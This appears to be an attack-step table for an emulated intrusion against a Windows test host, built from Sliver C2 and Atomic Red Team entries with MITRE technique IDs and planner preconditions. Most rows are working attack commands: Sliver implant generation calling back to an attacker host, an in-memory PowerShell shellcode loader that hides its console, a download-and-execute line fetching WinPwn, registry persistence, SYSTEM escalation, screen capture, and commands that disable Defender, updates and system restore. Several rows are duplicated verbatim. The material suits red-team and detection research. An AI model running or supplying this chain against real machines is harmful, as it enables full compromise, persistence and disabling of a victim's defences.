## Testbed Information
### Target Machine
- Machine ID: host11
    - OS: windows
    - CVE: []
## Attack Steps
| uuid | name | id | source | supported_platforms | tactics | technique | description | execution | arguments | preconditions | effects |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 2a602f8e-4d1f-49f1-b3b8-4b74f67cb63a | Build Shellcode for the Sliver implant (for Windows) | \['T1071.001'\] | Manual | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | The command is used in the Sliver C2 (Command and Control) framework to generate a shellcode payload designed for remote access to a target machine.<br> | {'executor': 'Sliver Console', 'command': 'sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shellcode --save #{SAVE_PATH}\nsliver > mtls --lport #{LPORT}\n'} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the generated payload', 'type': None}} | \['(os_windows ?target - host)', '(unallocated ?p - payload)', '(unallocated ?file - file)'\] | \['(sliver_implant_payload ?p - payload ?target - host)', '(shellcode_payload ?p - payload)', '(file_payload ?p - payload ?file - file)', '(bin_blob_file ?file - file)', '(file_prepared_local ?file - file)', '~(unallocated ?p - payload)', '~(unallocated ?file - file)'\] |
| 7480189e-1a4b-45f5-b225-c102915f7262 | Simulate the victim download a file on its machine | \['T1566.002'\] | Manual | \['windows'\] | \['Initial Access'\] | \['Phishing: Spearphishing Link'\] | This step simulates the victim accidentally downloads a malicious file by clicking a link. | {'executor': 'Human', 'command': "(This step needs human interaction and (temporarily) cannot be executed automatically)\n(On attacker's machine)\npython -m http.server\n\n(On victim's machine)\n1. Open #{LHOST}:#{LPORT} in the browser\n2. Navigate to the path of the file on the attacker's machine\n3. Download the file to #{PATH}\n"} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the downloaded payload', 'type': None}} | \['(file_prepared_local ?file - file)'\] | \['(file_exists ?path - path ?file - file ?t - host)'\] |
| 0617285b-6005-4a73-83c5-d4dc86fcdc35 | Simulate the victim executes a shellcode payload (Windows) | \['T1059.001', 'T1620'\] | Manual | \['windows'\] | \['Execution', 'Defense Evasion'\] | \['Command and Scripting Interpreter: PowerShell', 'Reflective Code Loading'\] | None | {'executor': 'Human', 'command': '(This step needs human interaction and (temporarily) cannot be executed automatically)\n(On victim\'s machine, open a powershell and execute these scripts)\n\n$s=\[System.IO.File\]::ReadAllBytes(\'#{SAVE_PATH}\');\n$c=\'using System;using System.Runtime.InteropServices;public class W{\[DllImport("kernel32")\]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);\[DllImport("kernel32")\]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);\[DllImport("kernel32")\]public static extern uint WaitForSingleObject(IntPtr a,uint b);\[DllImport("kernel32.dll")\]public static extern IntPtr GetConsoleWindow();\[DllImport("user32.dll")\]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}\';Add-Type -TypeDefinition $c;$hwnd=\[W\]::GetConsoleWindow();if($hwnd -ne \[IntPtr\]::Zero){\[W\]::ShowWindow($hwnd,0)};\n$p=\[W\]::VirtualAlloc(0,$s.Length,0x3000,0x40);\n\[System.Runtime.InteropServices.Marshal\]::Copy($s,0,$p,$s.Length);\n$h=\[W\]::CreateThread(0,0,$p,0,0,0);\[W\]::WaitForSingleObject($h,0xFFFFFFFF)\n'} | {'SAVE_PATH': {'default': None, 'description': 'Saved path of the downloaded shellcode payload file', 'type': None}} | \['(file_exists ?path - path ?file - file ?t - host)', '(bin_blob_file ?file - file)'\] | \['(file_executed ?file - file ?t - host)'\] |
| 1f401bbe-de24-41d2-8e34-d026e25bfb94 | Execute a Sliver Implant Payload | \['T1071.001'\] | Sliver | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | Executing a Sliver implant payload will establish a Sliver session.<br> | {'executor': 'None', 'command': 'None\n'} | None | \['(sliver_implant_payload ?p - payload ?t - host)', '(file_payload ?p - payload ?f - file)', '(file_executed ?f - file ?t - host)', '(unallocated ?s - executor)'\] | \['(sliver_session ?s - executor ?t - host)', '~(unallocated ?s - executor)', {'operator': 'When', 'params': {'condition': '(file_executed_as_root ?f - file ?t - host)', 'effect': '(elevated_executor ?s - executor)'}}\] |
| cf6f614c-83c9-4018-911b-c432bb95acfd | User Context Verification | \['T1087.001'\] | Sliver | \['windows', 'linux', 'macos'\] | \['Discovery'\] | \['Account Discovery: Local Account\n'\] | The `whoami` command retrieves the current user identity of the system. It executes the command on the remote system and returns the username of the account that is currently logged in. This command includes flag for setting a timeout. | {'executor': 'Sliver Executor', 'command': 'whoami(#{SessionID})'} | {'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \[{'operator': 'or', 'operands': \['(os_windows ?t - host)', '(os_linux ?t - host)', '(os_macos ?t - host)'\]}, '(sliver_session ?s - executor ?t - host)'\] | \['(user_info_known ?t - host)'\] |
| 7bfba376-cebc-4094-b1e6-5103b2e83c4e | Execute PowerShell Command | \['T1059.001'\] | Sliver | \['windows'\] | \['Execution'\] | \['Command and Scripting Interpreter: PowerShell\n'\] | The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine. | {'executor': 'Sliver Executor', 'command': 'powershell(#{SessionID},#{Commands})'} | {'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \['(os_windows ?t - host)', '(sliver_session ?s1 - executor ?t - host)'\] | \['(powershell ?s2 - executor ?t - host)', {'operator': 'When', 'params': {'condition': '(elevated_executor ?s1 - executor)', 'effect': '(elevated_executor ?s2 - executor)'}}\] |
| 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed | WinPwn - General privesc checks | \['T1082'\] | ART | \['windows'\] | \['Discovery'\] | \['System Information Discovery'\] | General privesc checks using the otherchecks function of WinPwn | {'executor': 'Powershell Executor', 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput"} | None | \['(powershell ?executor - executor ?target - host)', '(os_windows ?target - host)'\] | \['(system_time_info_known ?target - host)'\] |
| bb2176c4-855e-4b52-ab03-5fe2e58d8129 | Build DLL Sliver implant | \['T1071.001'\] | Manual | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.<br> | {'executor': 'Sliver Console', 'command': 'sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}\nsliver > mtls --lport #{LPORT}\n'} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the generated payload', 'type': None}} | \['(os_windows ?target - host)', '(unallocated ?p - payload)', '(unallocated ?file - file)'\] | \['(sliver_implant_payload ?p - payload ?target - host)', '(file_payload ?p - payload ?file - file)', '(dll_file ?file - file)', '(file_prepared_local ?file - file)', '~(unallocated ?p - payload)', '~(unallocated ?file - file)'\] |
| 3c898f62-626c-47d5-aad2-6de873d69153 | Windows Screencapture | \['T1113'\] | ART | \['windows'\] | \['Collection'\] | \['Screen Capture'\] | Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour<br> | {'executor': 'Powershell Executor', 'command': 'cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition \'\[DllImport("user32.dll")\] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);\' -Name U32 -Namespace W;\n\[W.U32\]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c "timeout 5 > NULL && psr.exe /stop"\n'} | {'output_file': {'description': 'Output file path', 'type': 'path', 'default': 'c:\\temp\\T1113_desktop.zip'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)'\] | \['(screenshot_data_saved ?file - file ?target - host)', '(file_exists ?output_file - path ?file - file ?target - host)'\] |
| 3c898f62-626c-47d5-aad2-6de873d69153 | Windows Screencapture | \['T1113'\] | ART | \['windows'\] | \['Collection'\] | \['Screen Capture'\] | Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour<br> | {'executor': 'Powershell Executor', 'command': 'cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition \'\[DllImport("user32.dll")\] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);\' -Name U32 -Namespace W;\n\[W.U32\]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c "timeout 5 > NULL && psr.exe /stop"\n'} | {'output_file': {'description': 'Output file path', 'type': 'path', 'default': 'c:\\temp\\T1113_desktop.zip'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)'\] | \['(screenshot_data_saved ?file - file ?target - host)', '(file_exists ?output_file - path ?file - file ?target - host)'\] |
| 3c898f62-626c-47d5-aad2-6de873d69153 | Windows Screencapture | \['T1113'\] | ART | \['windows'\] | \['Collection'\] | \['Screen Capture'\] | Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour<br> | {'executor': 'Powershell Executor', 'command': 'cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition \'\[DllImport("user32.dll")\] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);\' -Name U32 -Namespace W;\n\[W.U32\]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c "timeout 5 > NULL && psr.exe /stop"\n'} | {'output_file': {'description': 'Output file path', 'type': 'path', 'default': 'c:\\temp\\T1113_desktop.zip'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)'\] | \['(screenshot_data_saved ?file - file ?target - host)', '(file_exists ?output_file - path ?file - file ?target - host)'\] |
| 3c898f62-626c-47d5-aad2-6de873d69153 | Windows Screencapture | \['T1113'\] | ART | \['windows'\] | \['Collection'\] | \['Screen Capture'\] | Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour<br> | {'executor': 'Powershell Executor', 'command': 'cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition \'\[DllImport("user32.dll")\] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);\' -Name U32 -Namespace W;\n\[W.U32\]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c "timeout 5 > NULL && psr.exe /stop"\n'} | {'output_file': {'description': 'Output file path', 'type': 'path', 'default': 'c:\\temp\\T1113_desktop.zip'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)'\] | \['(screenshot_data_saved ?file - file ?target - host)', '(file_exists ?output_file - path ?file - file ?target - host)'\] |
| 3c898f62-626c-47d5-aad2-6de873d69153 | Windows Screencapture | \['T1113'\] | ART | \['windows'\] | \['Collection'\] | \['Screen Capture'\] | Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour<br> | {'executor': 'Powershell Executor', 'command': 'cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition \'\[DllImport("user32.dll")\] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);\' -Name U32 -Namespace W;\n\[W.U32\]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c "timeout 5 > NULL && psr.exe /stop"\n'} | {'output_file': {'description': 'Output file path', 'type': 'path', 'default': 'c:\\temp\\T1113_desktop.zip'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)'\] | \['(screenshot_data_saved ?file - file ?target - host)', '(file_exists ?output_file - path ?file - file ?target - host)'\] |
| 3c898f62-626c-47d5-aad2-6de873d69153 | Windows Screencapture | \['T1113'\] | ART | \['windows'\] | \['Collection'\] | \['Screen Capture'\] | Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour<br> | {'executor': 'Powershell Executor', 'command': 'cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition \'\[DllImport("user32.dll")\] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);\' -Name U32 -Namespace W;\n\[W.U32\]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c "timeout 5 > NULL && psr.exe /stop"\n'} | {'output_file': {'description': 'Output file path', 'type': 'path', 'default': 'c:\\temp\\T1113_desktop.zip'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)'\] | \['(screenshot_data_saved ?file - file ?target - host)', '(file_exists ?output_file - path ?file - file ?target - host)'\] |
| 3c898f62-626c-47d5-aad2-6de873d69153 | Windows Screencapture | \['T1113'\] | ART | \['windows'\] | \['Collection'\] | \['Screen Capture'\] | Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour<br> | {'executor': 'Powershell Executor', 'command': 'cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition \'\[DllImport("user32.dll")\] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);\' -Name U32 -Namespace W;\n\[W.U32\]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c "timeout 5 > NULL && psr.exe /stop"\n'} | {'output_file': {'description': 'Output file path', 'type': 'path', 'default': 'c:\\temp\\T1113_desktop.zip'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)'\] | \['(screenshot_data_saved ?file - file ?target - host)', '(file_exists ?output_file - path ?file - file ?target - host)'\] |
| 3c898f62-626c-47d5-aad2-6de873d69153 | Windows Screencapture | \['T1113'\] | ART | \['windows'\] | \['Collection'\] | \['Screen Capture'\] | Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour<br> | {'executor': 'Powershell Executor', 'command': 'cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition \'\[DllImport("user32.dll")\] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);\' -Name U32 -Namespace W;\n\[W.U32\]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c "timeout 5 > NULL && psr.exe /stop"\n'} | {'output_file': {'description': 'Output file path', 'type': 'path', 'default': 'c:\\temp\\T1113_desktop.zip'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)'\] | \['(screenshot_data_saved ?file - file ?target - host)', '(file_exists ?output_file - path ?file - file ?target - host)'\] |
| 7480189e-1a4b-45f5-b225-c102915f7262 | Simulate the victim download a file on its machine | \['T1566.002'\] | Manual | \['windows'\] | \['Initial Access'\] | \['Phishing: Spearphishing Link'\] | This step simulates the victim accidentally downloads a malicious file by clicking a link. | {'executor': 'Human', 'command': "(This step needs human interaction and (temporarily) cannot be executed automatically)\n(On attacker's machine)\npython -m http.server\n\n(On victim's machine)\n1. Open #{LHOST}:#{LPORT} in the browser\n2. Navigate to the path of the file on the attacker's machine\n3. Download the file to #{PATH}\n"} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the downloaded payload', 'type': None}} | \['(file_prepared_local ?file - file)'\] | \['(file_exists ?path - path ?file - file ?t - host)'\] |
| 1f401bbe-de24-41d2-8e34-d026e25bfb94 | Execute a Sliver Implant Payload | \['T1071.001'\] | Sliver | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | Executing a Sliver implant payload will establish a Sliver session.<br> | {'executor': 'None', 'command': 'None\n'} | None | \['(sliver_implant_payload ?p - payload ?t - host)', '(file_payload ?p - payload ?f - file)', '(file_executed ?f - file ?t - host)', '(unallocated ?s - executor)'\] | \['(sliver_session ?s - executor ?t - host)', '~(unallocated ?s - executor)', {'operator': 'When', 'params': {'condition': '(file_executed_as_root ?f - file ?t - host)', 'effect': '(elevated_executor ?s - executor)'}}\] |
| 5a1d2b9f-4e7f-8a4d-3f7a-6c2e5e9f9f7c | Privilege Escalation | \['T1134'\] | Sliver | \['windows'\] | \['Privilege Escalation'\] | \['Access Token Manipulation'\] | The `get_system` command attempts to gain SYSTEM-level privileges. | {'executor': 'Sliver Executor', 'command': 'get_system (#{hosting_process},#{config},#{SessionID})'} | {'hosting_process': {'description': 'Target process ID or name for privilege escalation'}, 'config': {'description': 'Configuration options for escalation method', 'default': 'Service'}, 'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \['(os_windows ?target - host)', '(sliver_session ?executorID - executor ?target - host)'\] | \['(elevated_executor ?executorID - executor)'\] |
| 2074d817-7819-401b-b552-1045672f77f3 | Execute Command (cmd.exe) | \['T1059.003'\] | Sliver | \['windows'\] | \['Execution'\] | \['Command and Scripting Interpreter: Windows Command Shell\n'\] | The `cmd.exe` command executes a Windows command. It runs the specified command on the remote host and returns the result. This command is useful for performing various system tasks. | {'executor': 'Sliver Executor', 'command': 'cmd(#{SessionID},#{Commands})'} | {'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \['(os_windows ?t - host)', '(sliver_session ?s1 - executor ?t - host)'\] | \['(command_prompt ?s2 - executor ?t - host)', {'operator': 'When', 'params': {'condition': '(elevated_executor ?s1 - executor)', 'effect': '(elevated_executor ?s2 - executor)'}}\] |
| 554cbd88-cde1-4b56-8168-0be552eed9eb | Reg Key RunOnce | \['T1547.001'\] | ART | \['windows'\] | \['Persistence', 'Privilege Escalation'\] | \['Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'\] | RunOnce Key Persistence.<br><br>Upon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. <br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "#{thing_to_execute}"\n'} | {'thing_to_execute': {'description': 'Thing to Run', 'type': 'path', 'default': 'C:\\Path\\AtomicRedTeam.dll'}} | \['(os_windows ?target - host)', '(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(file_exists ?thing_to_execute - path ?file - file ?target - host)', '(dll_file ?file - file)'\] | \['(file_execution_at_startup ?file - file ?target - host)'\] |
| f7f31777-1bbf-4ddc-b7a1-af9f46a5299b | Obtain a persistent Sliver Executor | \[None\] | Manual | \['windows', 'linux', 'macos'\] | \['Persistence'\] | \[None\] | Obtain the persistency of Sliver Executor via scheduled payload file execution.<br> | {'executor': 'None', 'command': 'None\n'} | None | \['(sliver_implant_payload ?p - payload ?target - host)', '(file_payload ?p - payload ?f - file)', {'operator': 'or', 'operands': \['(file_execution_at_time ?f - file ?target - host)', '(file_execution_at_startup ?f - file ?target - host)'\]}, '(unallocated ?s - executor)'\] | \['(persistent_sliver_session ?s - executor ?target - host)', '~(unallocated ?s - executor)'\] |
| 003f466a-6010-4b15-803a-cbb478a314d7 | Disable Windows Toast Notifications | \['T1112'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Modify Registry'\] | Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.<br>See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(toast_notification_disabled ?target - host)'\] |
| 3dacb0d2-46ee-4c27-ac1b-f9886bf91a56 | Disable Windows Lock Workstation Feature | \['T1112'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Modify Registry'\] | Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.<br>See how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(lock_workstation_disabled ?target - host)'\] |
| 1c68c68d-83a4-4981-974e-8993055fa034 | Windows - Disable the SR scheduled task | \['T1490'\] | ART | \['windows'\] | \['Impact'\] | \['Inhibit System Recovery'\] | Use schtasks.exe to disable the System Restore (SR) scheduled task<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'schtasks.exe /Change /TN "\\Microsoft\\Windows\\SystemRestore\\SR" /disable\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(system_restore_disabled ?target - host)'\] |
| 6e0d1131-2d7e-4905-8ca5-d6172f05d03d | Disable Windows Shutdown Button | \['T1112'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Modify Registry'\] | Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.<br>See how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(shutdown_button_disabled ?target - host)'\] |
| 1f6743da-6ecc-4a93-b03f-dc357e4b313f | Tamper with Windows Defender Registry - Reg.exe | \['T1562.001'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Impair Defenses: Disable or Modify Tools'\] | Disable Windows Defender by tampering with windows defender registry using the utility "reg.exe"<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableScriptScanning" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >NUL 2>nul \nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >NUL 2>nul\nreg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f >NUL 2>nul\nreg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection" /v "DisallowExploitProtectionOverride" /t REG_DWORD /d "0" /f >NUL 2>nul\nreg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v "TamperProtection"  /t REG_DWORD /d "0" /f >NUL 2>nul\nreg add "HKLM\\software\\microsoft\\windows defender\\spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f >NUL 2>nul\nreg add "HKLM\\Software\\Microsoft\\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f >NUL 2>nul\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(windows_defender_disabled ?target - host)'\] |
| 7bfba376-cebc-4094-b1e6-5103b2e83c4e | Execute PowerShell Command | \['T1059.001'\] | Sliver | \['windows'\] | \['Execution'\] | \['Command and Scripting Interpreter: PowerShell\n'\] | The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine. | {'executor': 'Sliver Executor', 'command': 'powershell(#{SessionID},#{Commands})'} | {'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \['(os_windows ?t - host)', '(sliver_session ?s1 - executor ?t - host)'\] | \['(powershell ?s2 - executor ?t - host)', {'operator': 'When', 'params': {'condition': '(elevated_executor ?s1 - executor)', 'effect': '(elevated_executor ?s2 - executor)'}}\] |
| 7bfba376-cebc-4094-b1e6-5103b2e83c4e | Execute PowerShell Command | \['T1059.001'\] | Sliver | \['windows'\] | \['Execution'\] | \['Command and Scripting Interpreter: PowerShell\n'\] | The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine. | {'executor': 'Sliver Executor', 'command': 'powershell(#{SessionID},#{Commands})'} | {'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \['(os_windows ?t - host)', '(sliver_session ?s1 - executor ?t - host)'\] | \['(powershell ?s2 - executor ?t - host)', {'operator': 'When', 'params': {'condition': '(elevated_executor ?s1 - executor)', 'effect': '(elevated_executor ?s2 - executor)'}}\] |
| 6b8df440-51ec-4d53-bf83-899591c9b5d7 | Tamper with Windows Defender ATP PowerShell | \['T1562.001'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Impair Defenses: Disable or Modify Tools'\] | Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled<br>in Windows settings.<br> | {'executor': 'Elevated Powershell Executor', 'command': 'Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n'} | None | \['(powershell ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(virus_and_threat_protection_disabled ?target - host)'\] |
| 01b20ca8-c7a3-4d86-af59-059f15ed5474 | Disable Windows OS Auto Update | \['T1112'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Modify Registry'\] | Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(auto_update_disabled ?target - host)'\] |
| 3e757ce7-eca0-411a-9583-1c33b8508d52 | Windows HideSCANetwork Group Policy Feature | \['T1112'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Modify Registry'\] | Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. <br>Take note that some Group Policy changes might require a restart to take effect.<br>See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(networking_icon_group_policy_disabled ?target - host)'\] |